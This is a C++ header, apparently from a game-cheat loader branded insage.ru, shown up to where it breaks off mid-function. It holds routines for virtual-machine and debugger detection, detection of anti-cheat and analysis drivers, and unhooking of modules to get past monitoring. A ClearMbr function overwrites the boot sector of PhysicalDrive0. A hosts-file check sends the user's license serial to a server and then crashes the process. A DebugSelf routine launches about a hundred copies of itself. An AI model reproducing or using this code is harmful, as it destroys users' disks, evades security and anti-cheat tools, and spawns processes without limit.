#pragma once
#include <windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include "lazy.h"
#include "csignal"
#include <chrono>
#include <thread>
#include "license.h"
#include "xorstr.h"

#define TERMINAL_SERVER_KEY ("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\")
#define GLASS_SESSION_ID    ("GlassSessionId")
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#define _HAS_EXCEPTIONS 0

DWORD WINAPI MainThread(LPVOID);

typedef DWORD(WINAPI* TCsrGetProcessId)(VOID);
typedef NTSTATUS(__stdcall* t_NtQuerySystemInformation)(IN ULONG, OUT PVOID, IN ULONG, OUT PULONG);

CLicense Postdata;
string NewSeriala = Postdata.GetSerial();
string ReLicDataa = NewSeriala.c_str();
string patha = PATH;
string ReLicenseUrla = patha + ReLicDataa;

struct DbgUiRemoteBreakinPatch
{
	WORD  push_0;
	BYTE  push;
	DWORD CurrentPorcessHandle;
	BYTE  mov_eax;
	DWORD TerminateProcess;
	WORD  call_eax;
};

typedef struct {
	PBYTE baseAddress;
	HMODULE(WINAPI* loadLibraryA)(PCSTR);
	FARPROC(WINAPI* getProcAddress)(HMODULE, PCSTR);
	void(WINAPI* rtlZeroMemory)(PVOID, SIZE_T);

	DWORD imageBase;
	DWORD relocVirtualAddress;
	DWORD importVirtualAddress;
	DWORD addressOfEntryPoint;
} LoaderData;

std::vector<std::string> vm_names = { "virtual", "qemu", "vmware", "oracle", "innotek", "zenbox", "c2ae", "capa" };
std::vector<std::string> legit_cpu_ids = { "AuthenticAMD", "GenuineIntel" };

SIZE_T ScanSegments(HANDLE proc)
{
	MEMORY_BASIC_INFORMATION meminfo;
	LPCVOID addr = 0;

	if (!proc)
		return 0;

	while (1)
	{
		if (VirtualQueryEx(proc, addr, &meminfo, sizeof(meminfo)) == 0)
			break;

		if ((meminfo.State == MEM_COMMIT) && (meminfo.Type & MEM_IMAGE) && (meminfo.Protect == PAGE_READWRITE) && (meminfo.RegionSize == 0x1000))
		{
			return (SIZE_T)meminfo.BaseAddress;
		}
		addr = (unsigned char*)meminfo.BaseAddress + meminfo.RegionSize;
	}
	return 0;
}

bool cpu_hypervisor_bit() 
{
	/*
		Check for hypervisor - enabled bit.
		eax = 0x1, 31st-bit of ECX
	*/
	std::array<int, 4> cpuInfo = { 0, 0, 0, 0 };
	__cpuid(cpuInfo.data(), 0x1);

	return (cpuInfo[2] >> 31) & 0x1;
}

bool str_includes(std::string str, std::vector<std::string> includes) 
{
	for (auto i : includes) {
		if (str.find(i) != std::string::npos) {
			return true;
		}
	}

	return false;
}

bool cpu_id() 
{
	/*
		Check for fake-vm CPU ID string.
		eax = 0x0, EBX + ECX + EDX (12 bytes)
	*/

	// TODO: I think there is something wrong with the regs order.
	std::array<int, 4> cpuInfo = { 0, 0, 0, 0 };
	std::string cpu = "";
	__cpuid(cpuInfo.data(), 0x0);

	for (int i = 1; i <= 3; i++) {
		cpu += cpuInfo[i] & 0xff;
		cpu += (cpuInfo[i] >> 8) & 0xff;
		cpu += (cpuInfo[i] >> 16) & 0xff;
		cpu += (cpuInfo[i] >> 24) & 0xff;
	}

	return !str_includes(cpu,legit_cpu_ids);
}

bool cpu_brand() 
{
	/*
		Check for fake-vm CPU brand name.
		eax = 0x80000002, 0x80000003, 0x80000004
		(EAX + EBX + ECX + EDX) x 3 = 36 bytes
	*/
	std::array<int, 4> cpuInfo = { 0, 0, 0, 0 };
	std::string cpu = "";

	for (int id = 2; id <= 4; id++) {
		__cpuid(cpuInfo.data(), 0x80000000 + id);

		for (auto i : cpuInfo) {
			cpu += std::tolower(i & 0xff);
			cpu += std::tolower((i >> 8) & 0xff);
			cpu += std::tolower((i >> 16) & 0xff);
			cpu += std::tolower((i >> 24) & 0xff);
		}
	}

	return str_includes(cpu, vm_names);
}

void unhook_module(const char* modulePath) 
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO moduleInfo = {};
	HMODULE moduleHandle = GetModuleHandleA(modulePath);

	if (moduleHandle == NULL) 
	{
		//std::cerr << "Failed to get handle for module: " << modulePath << std::endl;
		return;
	}

	GetModuleInformation(process, moduleHandle, &moduleInfo, sizeof(moduleInfo));
	LPVOID moduleBase = moduleInfo.lpBaseOfDll;

	HANDLE moduleFile = CreateFileA(modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (moduleFile == INVALID_HANDLE_VALUE) 
	{
		//std::cerr << "Failed to open file for module: " << modulePath << std::endl;
		CloseHandle(process);
		return;
	}

	HANDLE moduleMapping = CreateFileMapping(moduleFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (moduleMapping == NULL) 
	{
		//std::cerr << "Failed to create file mapping for module: " << modulePath << std::endl;
		CloseHandle(moduleFile);
		CloseHandle(process);
		return;
	}

	LPVOID mappingAddress = MapViewOfFile(moduleMapping, FILE_MAP_READ, 0, 0, 0);
	if (mappingAddress == NULL) 
	{
		//std::cerr << "Failed to map view of file for module: " << modulePath << std::endl;
		CloseHandle(moduleMapping);
		CloseHandle(moduleFile);
		CloseHandle(process);
		return;
	}

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)moduleBase + dosHeader->e_lfanew);

	for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) 
	{
		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)sectionHeader->Name, ".text")) 
		{
			DWORD oldProtection = 0;
			VirtualProtect((LPVOID)((DWORD_PTR)moduleBase + (DWORD_PTR)sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)moduleBase + (DWORD_PTR)sectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)mappingAddress + (DWORD_PTR)sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)moduleBase + (DWORD_PTR)sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(moduleFile);
	CloseHandle(moduleMapping);
	FreeLibrary(moduleHandle);
}

void Shutdown()
{
	LI_FN(raise).cached()(11);
}

void HstCheck()
{
	ifstream file(xorstr_("C://Windows//System32/drivers//etc//hosts")); //opens hosts
	string s;
	char c;

	while (!file.eof())
	{
		file.get(c);
		s.push_back(c);
	}

	file.close();

	int pos = s.find(xorstr_("insage.ru")); //founding for strings
	int pos2 = s.find(xorstr_("insage.xyz"));

	if (pos == -1 | pos2 == -1) //not found
	{
		
	}
	else
	{
		string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
		ServerRequesta;
		Shutdown();
		//asmbs(); //bsod
	}
}

void ClearMbr() 
{
	DWORD write;
	char empty[0x200u];
	ZeroMemory(empty, sizeof empty);
	HANDLE master_boot_record = CreateFile(xorstr_("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(master_boot_record, empty, 0x200u, &write, NULL);
	raise(SIGSEGV);
}

bool IsProcessRun(const char* const processName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &pe);

	while (1) 
	{
		if (strcmp(pe.szExeFile, processName) == 0) return true;
		if (!Process32Next(hSnapshot, &pe)) return false;
	}
}

bool CloseHandleR() //object
{

	__try
	{
		LI_FN(CloseHandle)((HANDLE)0xDEADBEEF);
		return false;
	}
	__except (EXCEPTION_INVALID_HANDLE == GetExceptionCode()
		? EXCEPTION_EXECUTE_HANDLER
		: EXCEPTION_CONTINUE_SEARCH)
	{
		return true;
	}
}

bool HeapProtect()
{
	PROCESS_HEAP_ENTRY HeapEntry = { 0 };
	do
	{
		if (!HeapWalk(GetProcessHeap(), &HeapEntry))
			return false;
	} while (HeapEntry.wFlags != PROCESS_HEAP_ENTRY_BUSY);

	PVOID pOverlapped = (PBYTE)HeapEntry.lpData + HeapEntry.cbData;
	return ((DWORD)(*(PDWORD)pOverlapped) == 0xABABABAB);
}

bool check_kuser_shared_data_structure()
{
	unsigned char i = *(unsigned char*)0x7ffe02d4;
	return ((i & 0x01) || (i & 0x02));
}

bool load_debug_info()
{
	CHAR szBuffer[] = { "C:\\Windows\\System32\\notepad.exe" };
	LoadLibraryA(szBuffer);
	return INVALID_HANDLE_VALUE == CreateFileA(szBuffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
}

bool RaiseException()
{
	__try
	{
		RaiseException(DBG_CONTROL_C, 0, 0, NULL);
		return true;
	}
	__except (DBG_CONTROL_C == GetExceptionCode()
		? EXCEPTION_EXECUTE_HANDLER
		: EXCEPTION_CONTINUE_SEARCH)
	{
		return false;
	}
}

bool RaiseExceptionPrint()
{
	__try
	{
		RaiseException(DBG_PRINTEXCEPTION_C, 0, 0, 0);
	}
	__except (GetExceptionCode() == DBG_PRINTEXCEPTION_C)
	{
		return false;
	}

	return true;
}

bool EnableDebugPrivilege()
{
	bool bResult = false;
	HANDLE hToken = NULL;
	DWORD ec = 0;

	do
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
			break;

		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
			break;

		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
			break;

		bResult = true;
	} while (0);

	if (hToken)
		CloseHandle(hToken);

	return bResult;
}

void DebugSelf()
{
	HANDLE hProcess = NULL;
	DEBUG_EVENT de;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	EnableDebugPrivilege();
	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	SecureZeroMemory(&de, sizeof(DEBUG_EVENT));

	GetStartupInfo(&si);

	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);

	ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_TERMINATE_PROCESS);

	WaitForDebugEvent(&de, INFINITE);
}

bool CheckWrittenPages() 
{
	BOOL result = FALSE, error = FALSE;

	const int SIZE_TO_CHECK = 4096;

	PVOID* addresses = static_cast<PVOID*>(VirtualAlloc(NULL, SIZE_TO_CHECK * sizeof(PVOID), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	if (addresses == NULL)
	{
		return true;
	}

	int* buffer = static_cast<int*>(VirtualAlloc(NULL, SIZE_TO_CHECK * SIZE_TO_CHECK, MEM_RESERVE | MEM_COMMIT | MEM_WRITE_WATCH, PAGE_READWRITE));
	if (buffer == NULL)
	{
		VirtualFree(addresses, 0, MEM_RELEASE);
		return true;
	}

	// Make some calls where a buffer *can* be written to, but isn't actually edited because we pass invalid parameters    
	if (GlobalGetAtomName(INVALID_ATOM, (LPTSTR)buffer, 1) != FALSE
		|| GetEnvironmentVariable("This variable does not exist", (LPSTR)buffer, 4096 * 4096) != FALSE
		|| GetBinaryType("This name does not exist", (LPDWORD)buffer) != FALSE
		|| HeapQueryInformation(0, (HEAP_INFORMATION_CLASS)69, buffer, 4096, NULL) != FALSE
		|| ReadProcessMemory(INVALID_HANDLE_VALUE, (LPCVOID)0x69696969, buffer, 4096, NULL) != FALSE
		|| GetThreadContext(INVALID_HANDLE_VALUE, (LPCONTEXT)buffer) != FALSE
		|| GetWriteWatch(0, &result, 0, NULL, NULL, (PULONG)buffer) == 0)
	{
		result = false;
		error = true;
	}

	if (error == FALSE)
	{
		// A this point all calls failed as they're supposed to
		ULONG_PTR hits = SIZE_TO_CHECK;
		DWORD granularity;
		if (GetWriteWatch(0, buffer, SIZE_TO_CHECK, addresses, &hits, &granularity) != 0)
		{
			result = FALSE;
		}
		else
		{
			// Should have zero reads here because GlobalGetAtomName doesn't probe the buffer until other checks have succeeded
			// If there's an API hook or debugger in here it'll probably try to probe the buffer, which will be caught here
			result = hits != 0;
		}
	}

	VirtualFree(addresses, 0, MEM_RELEASE);
	VirtualFree(buffer, 0, MEM_RELEASE);

	return result;
}

bool TestSign()
{
	HMODULE ntdll = GetModuleHandleA(xorstr_("ntdll.dll"));

	auto NtQuerySystemInformation = (t_NtQuerySystemInformation)GetProcAddress(ntdll, xorstr_("NtQuerySystemInformation"));

	SYSTEM_CODEINTEGRITY_INFORMATION cInfo;
	cInfo.Length = sizeof(cInfo);

	NtQuerySystemInformation(
		SystemCodeIntegrityInformation,
		&cInfo,
		sizeof(cInfo),
		NULL
	);

	return (cInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN)
		|| (cInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED);
}

bool IsDebuggersInstalled()
{
	LPVOID drivers[2048];
	DWORD cbNeeded;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[2048];

		cDrivers = cbNeeded / sizeof(drivers[0]);

		for (i = 0; i < cDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{
				std::string strDriver = szDriver;
				if (strDriver.find("kprocesshacker") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove Process Hacker, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("HttpDebug") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove HTTP Debugger, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("npf") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove Wireshark, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("TitanHide") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove TitanHide, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("vgk") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Disable Vanguard Anti-Cheat, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("faceitac") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Disable FaceIt Anti-Cheat, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("EasyAntiCheat") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Disable EAC Anti-Cheat, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("BEDaisy") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Disable Battleye Anti-Cheat, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("SharpOD_Drv") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove SharpOD, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("VMBusHID") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove HyperVisor, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("vmbus") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove HyperVisor, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("IndirectKmd") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove HyperVisor, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("HyperVideo") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove HyperVisor, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("hyperkbd") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove HyperVisor, before launching loader."), 1);
					return true;
				}
				if (strDriver.find("vboxdrv") != std::string::npos)
				{
					printf(xorstr_("[insage.ru] Remove VBOX, before launching loader."), 1);
					return true;
				}
			}
		}
	}
	if (TestSign())
	{
